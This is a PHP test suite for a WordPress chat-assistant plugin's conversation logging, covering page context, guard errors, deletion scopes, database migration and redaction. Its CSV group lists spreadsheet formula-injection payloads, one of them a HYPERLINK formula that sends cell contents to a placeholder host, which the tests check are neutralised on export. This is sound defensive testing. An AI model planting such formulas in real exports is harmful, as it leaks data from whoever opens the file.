<?php
/**
 * Casos do registro completo: nenhuma mensagem some, e toda uma carrega de qual
 * página saiu.
 *
 * O que se testa aqui é o que chega ao evento `livia_atendimento` — é ele que
 * alimenta a tabela. A gravação em si depende do $wpdb e fica de fora.
 */

defined( 'ABSPATH' ) || exit;

/** Escuta o evento e devolve tudo que passou por ele. */
function livia_teste_capturar( callable $corpo ) {
    $vistos = array();
    add_action(
        'livia_atendimento',
        function ( $dados ) use ( &$vistos ) {
            $vistos[] = $dados;
        }
    );
    $corpo();
    return $vistos;
}

/** Sessão já com contexto de página, como se tivesse sido aberta pelo widget. */
function livia_teste_sessao_na_pagina( $id = 42, $formulario = 'site-em-72h' ) {
    $sessao = Livia_Sessao::novo_id();
    Livia_Sessao::definir_contexto(
        $sessao,
        array(
            'pagina_id'     => $id,
            'pagina_url'    => '/site-em-72h/',
            'pagina_titulo' => 'Briefing — Site em 72h',
            'formulario'    => $formulario,
        )
    );
    return array( $sessao, Livia_Rest::assinar( $sessao, time() + 600 ) );
}

return array(

	array(
		'grupo' => 'registro',
		'nome'  => 'resposta normal leva a página junto',
		'executar' => function () {
			livia_teste_zerar();
			livia_teste_config();
			livia_teste_responder_com( 'Domínio é o endereço do seu site.' );

			list( , $token ) = livia_teste_sessao_na_pagina();

			$vistos = livia_teste_capturar( function () use ( $token ) {
				Livia_Rest::mensagem( new Livia_Req_Teste( array( 'token' => $token, 'pergunta' => 'o que e dominio' ) ) );
			} );

			if ( 1 !== count( $vistos ) ) {
				return 'registrou ' . count( $vistos ) . ' eventos, esperava 1';
			}
			$c = $vistos[0]['contexto'];
			if ( 42 !== $c['pagina_id'] || 'site-em-72h' !== $c['formulario'] ) {
				return 'contexto perdido: ' . wp_json_encode( $c );
			}
			return 'modelo' === $vistos[0]['origem'] ? null : 'origem errada: ' . $vistos[0]['origem'];
		},
	),

	array(
		'grupo' => 'registro',
		'nome'  => 'pergunta longa demais é REGISTRADA, não some',
		'executar' => function () {
			livia_teste_zerar();
			livia_teste_config();
			list( , $token ) = livia_teste_sessao_na_pagina();

			$vistos = livia_teste_capturar( function () use ( $token ) {
				Livia_Rest::mensagem(
					new Livia_Req_Teste( array( 'token' => $token, 'pergunta' => str_repeat( 'a', 5000 ) ) )
				);
			} );

			if ( 1 !== count( $vistos ) ) {
				return 'a mensagem sumiu do registro';
			}
			if ( 'guarda' !== $vistos[0]['origem'] ) {
				return 'marcou como erro de API o que nem chegou à API';
			}
			// A pergunta tem que estar lá: é ela que diz o que o cliente tentou.
			if ( 5000 !== strlen( $vistos[0]['pergunta'] ) ) {
				return 'guardou a pergunta pela metade';
			}
			return 'longa' === $vistos[0]['erro'] ? null : 'erro: ' . $vistos[0]['erro'];
		},
	),

	array(
		'grupo' => 'registro',
		'nome'  => 'disjuntor aberto também vai para o registro',
		'executar' => function () {
			livia_teste_zerar();
			livia_teste_config();
			for ( $i = 0; $i < Livia_Limites::teto_diario(); $i++ ) {
				Livia_Limites::registrar_chamada();
			}
			list( , $token ) = livia_teste_sessao_na_pagina();

			$vistos = livia_teste_capturar( function () use ( $token ) {
				Livia_Rest::mensagem( new Livia_Req_Teste( array( 'token' => $token, 'pergunta' => 'o que e dominio' ) ) );
			} );

			if ( 1 !== count( $vistos ) ) {
				return 'a pergunta barrada pelo disjuntor não foi registrada';
			}
			return 'disjuntor' === $vistos[0]['erro'] && 'guarda' === $vistos[0]['origem']
				? null
				: 'registrou errado: ' . wp_json_encode( array( $vistos[0]['erro'], $vistos[0]['origem'] ) );
		},
	),

	array(
		'grupo' => 'registro',
		'nome'  => 'enxurrada de ritmo registra a primeira, não as quarenta',
		'executar' => function () {
			livia_teste_zerar();
			livia_teste_config();
			livia_teste_responder_com( 'ok' );
			list( $sessao, $token ) = livia_teste_sessao_na_pagina();

			// Estoura o teto da conversa e continua batendo.
			for ( $i = 0; $i < Livia_Limites::POR_JANELA_SESSAO; $i++ ) {
				Livia_Limites::pode_perguntar( $sessao );
			}

			$vistos = livia_teste_capturar( function () use ( $token ) {
				for ( $i = 0; $i < 8; $i++ ) {
					Livia_Rest::mensagem( new Livia_Req_Teste( array( 'token' => $token, 'pergunta' => 'oi' ) ) );
				}
			} );

			// Registrar as oito daria a um script uma escrita de banco por
			// requisição — que é exatamente o que o limite existe para evitar.
			if ( 1 !== count( $vistos ) ) {
				return 'registrou ' . count( $vistos ) . ' de 8 tentativas barradas, esperava 1';
			}
			return 'muitas_perguntas' === $vistos[0]['erro'] ? null : 'erro: ' . $vistos[0]['erro'];
		},
	),

	array(
		'grupo' => 'registro',
		'nome'  => 'erro da API continua marcado como erro da API, não como guarda',
		'executar' => function () {
			livia_teste_zerar();
			livia_teste_config();
			add_filter( 'livia_pre_gerar', function () {
				return new WP_Error( 'cota', 'estourou' );
			} );
			list( , $token ) = livia_teste_sessao_na_pagina();

			$vistos = livia_teste_capturar( function () use ( $token ) {
				Livia_Rest::mensagem( new Livia_Req_Teste( array( 'token' => $token, 'pergunta' => 'o que e dominio' ) ) );
			} );

			if ( 1 !== count( $vistos ) ) {
				return 'não registrou';
			}
			// Misturar os dois faria a taxa de erro da API virar ficção.
			return 'modelo' === $vistos[0]['origem'] && 'cota' === $vistos[0]['erro']
				? null
				: 'separação furada: ' . wp_json_encode( array( $vistos[0]['origem'], $vistos[0]['erro'] ) );
		},
	),

	array(
		'grupo' => 'registro',
		'nome'  => 'resposta barrada pela trava guarda o texto ORIGINAL, não o seguro',
		'executar' => function () {
			livia_teste_zerar();
			livia_teste_config();
			livia_teste_responder_com( 'Liga para (11) 98765-4321.' );
			list( , $token ) = livia_teste_sessao_na_pagina();

			$vistos = livia_teste_capturar( function () use ( $token ) {
				Livia_Rest::mensagem( new Livia_Req_Teste( array( 'token' => $token, 'pergunta' => 'qual o telefone' ) ) );
			} );

			if ( 1 !== count( $vistos ) ) {
				return 'não registrou';
			}
			// O texto seguro não ensina nada; o inventado é a evidência.
			if ( false === strpos( $vistos[0]['resposta'], '98765-4321' ) ) {
				return 'guardou o texto seguro e perdeu a evidência';
			}
			return ! empty( $vistos[0]['bloqueio'] ) ? null : 'não marcou o motivo do bloqueio';
		},
	),

	array(
		'grupo' => 'limpeza',
		'nome'  => 'cada escopo apaga exatamente a sua faixa',
		'executar' => function () {
			livia_teste_zerar();

			Livia_Registro::apagar( 'hoje' );
			$sql = $GLOBALS['wpdb']->consultas[0];
			if ( false === strpos( $sql, 'criado_em >=' ) ) {
				return '"hoje" não filtrou pelo começo do dia: ' . $sql;
			}

			livia_teste_zerar();
			Livia_Registro::apagar( 'ate' );
			$sql = $GLOBALS['wpdb']->consultas[0];
			if ( false === strpos( $sql, 'criado_em <' ) || false !== strpos( $sql, 'criado_em <=' ) ) {
				return '"ate" apagaria também o dia de hoje: ' . $sql;
			}

			livia_teste_zerar();
			Livia_Registro::apagar( 'tudo' );
			$sql = $GLOBALS['wpdb']->consultas[0];
			if ( false !== strpos( $sql, 'WHERE' ) ) {
				return '"tudo" veio com filtro: ' . $sql;
			}
			return null;
		},
	),

	array(
		'grupo' => 'limpeza',
		'nome'  => 'escopo desconhecido apaga NADA, não tudo',
		'executar' => function () {
			// O caminho perigoso é um `else` que apaga a tabela inteira quando
			// o valor chega errado. Um erro de digitação, hoje ou daqui a um
			// ano, não pode valer perda total do registro.
			foreach ( array( '', 'qualquer', 'TUDO', '1', 'tud' ) as $ruim ) {
				livia_teste_zerar();
				$n = Livia_Registro::apagar( $ruim );

				if ( $GLOBALS['wpdb']->consultas ) {
					return 'rodou DELETE com escopo ' . var_export( $ruim, true )
						. ': ' . $GLOBALS['wpdb']->consultas[0];
				}
				if ( 0 !== $n ) {
					return 'disse ter apagado ' . $n . ' com escopo inválido';
				}
			}
			return null;
		},
	),

	array(
		'grupo' => 'limpeza',
		'nome'  => 'apagar uma conversa só toca naquela sessão',
		'executar' => function () {
			livia_teste_zerar();
			$sessao = Livia_Sessao::novo_id();

			Livia_Registro::apagar_conversa( $sessao );

			$sql = $GLOBALS['wpdb']->consultas[0];
			if ( false === strpos( $sql, 'WHERE sessao =' ) ) {
				return 'apagou sem filtrar por sessão: ' . $sql;
			}
			return null;
		},
	),

	array(
		'grupo' => 'csv',
		'nome'  => 'pergunta que vira fórmula no Excel é neutralizada na exportação',
		'executar' => function () {
			// Quem escreve isto no chat não quer saber de domínio: quer que o
			// relatório execute algo na máquina de quem atende.
			$ataques = array(
				'=HYPERLINK("http://exemplo.invalido/?d="&A1,"clique")',
				'+1+1',
				'-2+3',
				'@SUM(A1:A9)',
				chr( 9 ) . '=1+1',
			);
			foreach ( $ataques as $bruto ) {
				$saida = Livia_Registro::celula( $bruto );
				if ( "'" !== $saida[0] ) {
					return 'passou sem escapar: ' . $bruto;
				}
				if ( substr( $saida, 1 ) !== $bruto ) {
					return 'escapou mas mexeu no texto: ' . $saida;
				}
			}
			return null;
		},
	),

	array(
		'grupo' => 'csv',
		'nome'  => 'pergunta normal não ganha apóstrofo à toa',
		'executar' => function () {
			$normais = array(
				'o que e dominio?',
				'quanto tempo demora',
				'',
				'R$ 100 é o limite?',
				'2 + 2 no meio do texto',
			);
			foreach ( $normais as $texto ) {
				if ( Livia_Registro::celula( $texto ) !== $texto ) {
					return 'sujou um texto inocente: ' . $texto;
				}
			}
			return null;
		},
	),

	array(
		'grupo' => 'banco',
		'nome'  => 'tique diário some do agendamento e volta sozinho na carga seguinte',
		'executar' => function () {
			livia_teste_zerar();
			update_option( Livia_Registro::OPCAO_VERSAO, Livia_Registro::VERSAO_TABELA );

			// Estado de quem restaurou um backup, ou rodou um plugin de limpeza
			// de cron: a tabela está certa, o agendamento sumiu.
			if ( wp_next_scheduled( Livia_Registro::CRON ) ) {
				return 'o teste começou com o cron já agendado';
			}

			Livia_Registro::manutencao();

			// Sem isto, o expurgo dos 90 dias nunca mais rodaria e ninguém
			// perceberia — a LivIA continuaria respondendo normalmente.
			return wp_next_scheduled( Livia_Registro::CRON ) ? null : 'não reagendou';
		},
	),

	array(
		'grupo' => 'banco',
		'nome'  => 'atualizar por cima dos arquivos migra a tabela sem passar pela ativação',
		'executar' => function () {
			livia_teste_zerar();
			// Banco no schema antigo, código no novo: é o estado de quem subiu
			// a versão nova por FTP, sem desativar e reativar o plugin.
			update_option( Livia_Registro::OPCAO_VERSAO, 1 );

			Livia_Registro::conferir_tabela();

			if ( ! $GLOBALS['_stub_dbdelta'] ) {
				// Sem isto, os inserts falhariam calados: o cliente veria a
				// resposta e a linha simplesmente não existiria.
				return 'não migrou — a tabela ficaria sem as colunas novas';
			}
			return (int) get_option( Livia_Registro::OPCAO_VERSAO ) === Livia_Registro::VERSAO_TABELA
				? null
				: 'migrou mas não anotou a versão — rodaria de novo a cada requisição';
		},
	),

	array(
		'grupo' => 'banco',
		'nome'  => 'banco em dia não roda dbDelta a cada carregamento',
		'executar' => function () {
			livia_teste_zerar();
			update_option( Livia_Registro::OPCAO_VERSAO, Livia_Registro::VERSAO_TABELA );

			Livia_Registro::conferir_tabela();

			return $GLOBALS['_stub_dbdelta']
				? 'rodou dbDelta com o banco já atualizado — em toda requisição do site'
				: null;
		},
	),

	array(
		'grupo' => 'banco',
		'nome'  => 'o CREATE TABLE respeita as manias do dbDelta',
		'executar' => function () {
			livia_teste_zerar();
			delete_option( Livia_Registro::OPCAO_VERSAO );
			Livia_Registro::instalar();

			$sql = $GLOBALS['_stub_dbdelta'][0];

			// dbDelta compara texto. Um espaço a menos aqui e ele decide que a
			// chave primária mudou, toda vez, em toda requisição.
			if ( false === strpos( $sql, 'PRIMARY KEY  (id)' ) ) {
				return 'PRIMARY KEY sem os dois espaços que o dbDelta exige';
			}
			foreach ( array( 'origem', 'pagina_id', 'pagina_url', 'pagina_titulo', 'formulario' ) as $coluna ) {
				if ( false === strpos( $sql, $coluna ) ) {
					return 'faltou a coluna ' . $coluna;
				}
			}
			return null;
		},
	),

	array(
		'grupo' => 'banco',
		'nome'  => 'a linha gravada leva a página, e a pergunta vai redigida',
		'executar' => function () {
			livia_teste_zerar();

			Livia_Registro::registrar(
				array(
					'sessao'   => str_repeat( 'a', 32 ),
					'pergunta' => 'meu e-mail e joao@exemplo.com, onde coloco',
					'resposta' => 'No campo de contato.',
					'origem'   => 'modelo',
					'contexto' => array(
						'pagina_id'     => 42,
						'pagina_url'    => '/site-em-72h/',
						'pagina_titulo' => 'Briefing — Site em 72h',
						'formulario'    => 'site-em-72h',
					),
				)
			);

			$inseridos = $GLOBALS['wpdb']->inseridos;
			if ( 1 !== count( $inseridos ) ) {
				return 'gravou ' . count( $inseridos ) . ' linhas, esperava 1';
			}
			$linha = $inseridos[0][1];

			if ( 42 !== $linha['pagina_id'] || 'site-em-72h' !== $linha['formulario'] ) {
				return 'a página não chegou até a linha: ' . wp_json_encode( $linha );
			}
			// A redação acontece na gravação, não antes — o evento carrega o
			// texto cru para quem quiser tratá-lo de outro jeito.
			if ( false !== strpos( $linha['pergunta'], 'joao@exemplo.com' ) ) {
				return 'gravou o e-mail do cliente sem redigir';
			}
			return false !== strpos( $linha['pergunta'], '[email]' ) ? null : 'perdeu o texto da pergunta';
		},
	),

	array(
		'grupo' => 'registro',
		'nome'  => 'sessão sem página identificada não quebra o registro',
		'executar' => function () {
			livia_teste_zerar();
			livia_teste_config();
			livia_teste_responder_com( 'ok' );

			// Sessão aberta sem contexto — widget antigo, ou shortcode fora de post.
			list( , $token ) = livia_teste_sessao();

			$vistos = livia_teste_capturar( function () use ( $token ) {
				Livia_Rest::mensagem( new Livia_Req_Teste( array( 'token' => $token, 'pergunta' => 'o que e dominio' ) ) );
			} );

			if ( 1 !== count( $vistos ) ) {
				return 'não registrou';
			}
			return is_array( $vistos[0]['contexto'] ) ? null : 'contexto veio quebrado';
		},
	),
);
